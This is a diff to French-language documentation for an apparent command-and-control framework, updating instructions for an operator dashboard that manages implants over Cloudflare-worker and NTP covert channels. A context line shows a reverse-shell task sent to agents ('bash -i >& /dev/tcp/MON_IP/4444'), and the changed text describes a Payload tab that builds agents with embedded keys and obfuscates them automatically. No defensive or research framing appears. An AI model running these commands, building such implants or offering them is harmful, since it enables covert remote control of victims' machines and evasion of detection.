@@ -304,11 +304,18 @@ python3 operator_cli.py task 3685 "bash -i >& /dev/tcp/MON_IP/4444 0>&1"
 
 ---
 
-## TUI — tableau de bord interactif (canal Cloudflare uniquement)
+## TUI — tableau de bord interactif (commun aux deux canaux)
+
+Pointée vers le bon port admin selon le canal utilisé :
 
 ```bash
-cd Modules/C2/cloudflare-worker
-WORKER_URL=https://... C2_PSK=... python3 tui.py
+cd Modules/C2
+
+# Canal Cloudflare (admin port 1337)
+WORKER_URL=https://... C2_PSK=... C2_ADMIN_PORT=1337 python3 tui.py
+
+# Canal NTP (admin port 1338)
+C2_PSK=... C2_ADMIN_PORT=1338 python3 tui.py
 ```
 
 ```
@@ -324,7 +331,11 @@ WORKER_URL=https://... C2_PSK=... python3 tui.py
   r = refresh   Enter = sélectionner/envoyer   q = quitter
 ```
 
-L'onglet **Payload** génère un `agent.py` personnalisé avec les bons `WORKER_URL` et `C2_PSK` intégrés, et peut l'obfusquer automatiquement.
+L'onglet **Payload** génère un agent personnalisé selon le type choisi :
+- **cloudflare** : bake `cloudflare-worker/agent.py` avec `WORKER_URL` et `C2_PSK`
+- **ntp** : bake `ntp/agent.py` avec `C2_PSK`, intervalle et jitter (pas de WORKER URL)
+
+Les deux modes supportent l'obfuscation automatique via `obfuscator_py.py`.
 
 ---
 
